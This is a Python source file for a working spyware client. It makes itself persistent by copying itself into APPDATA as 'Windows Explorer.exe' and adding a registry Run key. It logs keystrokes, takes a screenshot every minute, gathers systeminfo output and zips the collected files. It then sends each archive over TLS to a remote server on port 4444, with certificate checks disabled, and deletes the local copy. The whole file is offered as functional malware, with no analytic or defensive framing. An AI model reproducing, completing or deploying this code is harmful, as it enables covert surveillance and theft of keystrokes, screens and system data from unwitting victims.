import os
import time
from datetime import datetime
from PIL import ImageGrab
import threading
import keylogger
import zipfile
import ssl
import socket
import shutil
import subprocess

TARGETDIR = '' # Target directory
HOST = '' # Server address
PORT = 4444 # Server port
CERTFILE = 'client.crt' 
KEYFILE = 'client.key'

def ensure_directory_exists():
    try:
        directory_path = TARGETDIR
        # Check if the directory already exists
        if not os.path.exists(directory_path):
            # Create the directory if it doesn't exist
            os.makedirs(directory_path)
            print(f"Directory '{directory_path}' created.")
        else:
            print(f"Directory '{directory_path}' already exists.")
    except OSError as e:
        print(f"Error creating directory '{directory_path}': {e}")

def become_persistent():
    try:
        appdata_dir = os.environ.get("APPDATA")
        if appdata_dir:
            evil_file_location = os.path.join(appdata_dir, "Windows Explorer.exe")
            if not os.path.exists(evil_file_location):
                # Assuming you want to make the script itself persistent
                shutil.copyfile(__file__, evil_file_location)
                # Update registry
                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{evil_file_location}"'
                subprocess.call(command, shell=True)
                print("Persistence achieved successfully!")
            else:
                print("File already exists in AppData directory.")
        else:
            print("Error: Could not get AppData directory path.")
    except Exception as e:
        print(f"Error: {e}")

def system_info():
    directory_sys =  TARGETDIR
    timestamp_sys = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename_sys = f'systeminfo_{timestamp_sys}.txt'
    systeminfo_path = os.path.join(directory_sys,filename_sys)
    with open(systeminfo_path, 'w') as file:
        result = subprocess.run(['systeminfo'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        file.write(result.stdout)

def mykeylogger():
    log_directory = TARGETDIR
    my_keylogger = keylogger.Keylogger(50, log_directory)
    my_keylogger.start()
    
def take_screenshot():
    while True:
        directory_shot = TARGETDIR
        timestamp_shot = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename_shot = f'screenshot_{timestamp_shot}.png'
        screenshot_path = os.path.join(directory_shot, filename_shot)
        ImageGrab.grab().save(screenshot_path)
        print(f"Screenshot saved at {screenshot_path}")
        time.sleep(60)

def monitor_and_zip_files():
    def zip_files(files_to_zip, output_zip_file):
        """Helper function to compress files into a zip file."""
        try:
            with zipfile.ZipFile(output_zip_file, 'w') as zipf:
                for file in files_to_zip:
                    zipf.write(file, arcname=os.path.basename(file))
            print(f"Successfully compressed files in: {output_zip_file}")
        except Exception as e:
            print(f"Error zipping files: {e}")

    while True:
        try:
            directory = TARGETDIR  
            current_time = time.time()
            files_to_zip = []

            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.splitext(file_path)[1].lower() != '.zip' and os.path.getmtime(file_path) < (current_time - 60):
                        files_to_zip.append(file_path)

            if files_to_zip:
                timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
                output_zip_file = os.path.join(directory, f"{timestamp}.zip")
                zip_files(files_to_zip, output_zip_file)
            else:
                print("No files to compress. All files have been recently modified or are zip files.")
        except Exception as e:
            print(f"Error monitoring files: {e}")
        time.sleep(60)  # Delay for 60 seconds before checking again

def monitor_send_zip(path, callback):
    """ Checks ZIP files that have not been modified for more than 60 seconds and calls the callback for each one. """
    while True:
        for filename in os.listdir(path):
            filepath = os.path.join(path, filename)
            if filepath.endswith('.zip') and time.time() - os.path.getmtime(filepath) > 60:
                callback(filepath)
        time.sleep(10)  # Interval between checks

def create_tls_connection():
    """ Creates a TLS connection to the server. """
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((HOST, PORT))
    ssock = context.wrap_socket(sock, server_hostname=HOST)
    return ssock

def send_file(ssock, file_path):
    """ Send a file over a TLS socket. """
    with open(file_path, 'rb') as file:
        ssock.sendall(file.read())

def delete_file(file_path):
    """ Deletes the specified file. """
    os.remove(file_path)

def handle_file(file_path):
    """ Processes a file: sends and then deletes it. """
    ssock = create_tls_connection()
    try:
        send_file(ssock, file_path)
        delete_file(file_path)
    finally:
        ssock.close()

# Threads
def start_ensure_directory_exists():
    thread = threading.Thread(target=ensure_directory_exists)
    thread.daemon = True
    thread.start()

def start_become_persistent():
    thread = threading.Thread(target=become_persistent)
    thread.daemon = True
    thread.start()

def start_system_info():
    thread = threading.Thread(target=system_info)
    thread.daemon = True
    thread.start()

def start_mykeylogger():
    thread = threading.Thread(target=mykeylogger)
    thread.daemon = True
    thread.start()

def start_take_screenshot():
    thread = threading.Thread(target=take_screenshot)
    thread.daemon = True
    thread.start()

def start_monitor_and_zip_files():
    thread = threading.Thread(target=monitor_and_zip_files)
    thread.daemon = True
    thread.start()

def start_monitor_send_zip():
    thread = threading.Thread(target=monitor_send_zip, args=(TARGETDIR, handle_file))
    thread.daemon = True  
    thread.start()

def main():
    start_ensure_directory_exists()
    start_become_persistent()
    start_system_info()
    start_mykeylogger()
    start_take_screenshot()
    start_monitor_and_zip_files()
    start_monitor_send_zip()
    
    # Keep the main thread running, otherwise daemons will be terminated too early
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Program terminated by user.")

if __name__ == '__main__': 
    main()
   
